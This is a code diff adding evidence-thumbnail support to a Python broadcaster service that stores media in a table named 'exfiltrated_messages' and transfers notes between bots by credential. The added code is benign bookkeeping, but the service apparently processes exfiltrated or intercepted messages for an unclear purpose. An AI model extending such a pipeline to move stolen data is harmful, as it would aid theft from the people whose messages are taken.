@@ -399,6 +399,38 @@ class BroadcasterService:
             logger.warning(f"    ⚠️ [Broadcaster] _download_media_bytes failed: {exc}")
             return None
 
+    async def _persist_thumb_path(self, message_id: Any, file_meta: dict) -> None:
+        """Merge ``thumb_path`` into the stored file_meta (best-effort).
+
+        Re-reads the row first so a concurrent heavy-enrichment write (OCR
+        text) is not clobbered by the thumbnail merge.
+        """
+        merged = dict(file_meta)
+        res = await _async_execute(
+            db.table("exfiltrated_messages").select("file_meta").eq("id", message_id).limit(1)
+        )
+        rows = res.data or []
+        stored = rows[0].get("file_meta") if rows else None
+        if isinstance(stored, dict):
+            merged = {**stored, **merged}
+        await _async_execute(
+            db.table("exfiltrated_messages").update({"file_meta": merged}).eq("id", message_id)
+        )
+
+    async def _attach_thumbnail(self, msg_obj: dict, media_type: str, media_bytes: bytes | None) -> None:
+        """Best-effort evidence thumbnail; a failure never changes the send outcome."""
+        try:
+            from app.services.thumbnails import attach_thumbnail
+
+            await attach_thumbnail(
+                msg_obj,
+                media_type,
+                media_bytes,
+                persist=self._persist_thumb_path,
+            )
+        except Exception as exc:
+            logger.warning(f"    ⚠️ [Broadcaster] thumbnail hook skipped: {exc}")
+
     async def _transfer_note_media(self, target: Bot, transfer: NoteTransfer) -> NoteTransferResult | None:
         if not transfer.credential_id:
             return None
@@ -592,6 +624,9 @@ class BroadcasterService:
                                     f"    ✅ [Broadcaster] Successfully sent {media_type} "
                                     f"({len(media_bytes)} bytes, filename={filename})"
                                 )
+                                # Evidence thumbnail: image media only, and a
+                                # failure must never affect the delivery above.
+                                await self._attach_thumbnail(msg_obj, media_type, media_bytes)
                                 if follow_text_parts:
                                     try:
                                         for _part in follow_text_parts:
